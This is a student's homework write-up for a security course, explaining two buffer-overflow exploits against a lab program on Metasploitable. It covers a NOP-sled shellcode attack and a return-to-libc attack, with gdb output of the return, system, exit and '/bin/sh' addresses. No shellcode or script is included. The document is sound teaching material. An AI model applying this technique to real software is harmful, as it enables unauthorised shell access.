CSE 331 HW 2
Ji En Chen
ID#: 109896249
 
exploit1.py
 
 I was able to retrieve the return address of 0xbffffd80 by inputting enough characters to overflow the buffer in gdb.

 I found a suitable shellcode (of length 76) online that could bypass the filter in vuln1. 

 Buffersize (256) + 4 = 260 - Shellcode length (76) = 184 length of NOP sled.

 I then added 10 return addresses to increase the chance of success.

exploit2.py

 I was able to retrieve the memory address of system and exit through gdb.

 	msfadmin@metasploitable:~/vulnerable$ gdb ./vuln1
	GNU gdb 6.8-debian
	Copyright (C) 2008 Free Software Foundation, Inc.
	License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
	This is free software: you are free to change and redistribute it.
	There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
	and "show warranty" for details.
	This GDB was configured as "i486-linux-gnu"...
	(gdb) start
	Breakpoint 1 at 0x80483dd: file vuln1.c, line 9.
	Starting program: /home/msfadmin/vulnerable/vuln1
	main (argc=1, argv=0xbffffd54) at vuln1.c:9
	9         for (i=0; i<strlen(argv[1]); i++) {
	(gdb) print exit
	$1 = {<text variable, no debug info>} 0xb7eb7fb0 <exit>
	(gdb) print system
	$2 = {<text variable, no debug info>} 0xb7ec2990 <system>

 For the address of "/bin/sh", I looked in the libc section of memory using:

 	(gdb)info proc map
		process 10292
		cmdline = '/home/msfadmin/vulnerable/vuln1'
		cwd = '/home/msfadmin/vulnerable'
		exe = '/home/msfadmin/vulnerable/vuln1'
		Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x8048000  0x8049000     0x1000          0      /home/msfadmin/vulnerab                             le/vuln1
        0x8049000  0x804a000     0x1000          0      /home/msfadmin/vulnerab                             le/vuln1
        0xb7e89000 0xb7e8a000     0x1000 0xb7e89000
        0xb7e8a000 0xb7fd3000   0x149000          0      /lib/tls/i686/cmov/libc                             -2.7.so
        0xb7fd3000 0xb7fd4000     0x1000   0x149000      /lib/tls/i686/cmov/libc                             -2.7.so
        0xb7fd4000 0xb7fd6000     0x2000   0x14a000      /lib/tls/i686/cmov/libc                             -2.7.so
        0xb7fd6000 0xb7fd9000     0x3000 0xb7fd6000
        0xb7fe1000 0xb7fe3000     0x2000 0xb7fe1000
        0xb7fe3000 0xb7fe4000     0x1000 0xb7fe3000           [vdso]
        0xb7fe4000 0xb7ffe000    0x1a000          0      /lib/ld-2.7.so
        0xb7ffe000 0xb8000000     0x2000    0x19000      /lib/ld-2.7.so
---Type <return> to continue, or q <return> to quit---
        0xbffeb000 0xc0000000    0x15000 0xbffeb000           [stack]


 I specifically looked through these libc memory locations.
        0xb7e8a000 0xb7fd3000   0x149000          0      /lib/tls/i686/cmov/libc                             -2.7.so
        0xb7fd3000 0xb7fd4000     0x1000   0x149000      /lib/tls/i686/cmov/libc                             -2.7.so
        0xb7fd4000 0xb7fd6000     0x2000   0x14a000      /lib/tls/i686/cmov/libc                             -2.7.so
        0xb7fd6000 0xb7fd9000     0x3000 0xb7fd6000

 I filed the buffer(256) and 4 bytes with 260 "A"'s. I then added the address of system, exit, and /bin/sh in little endian.
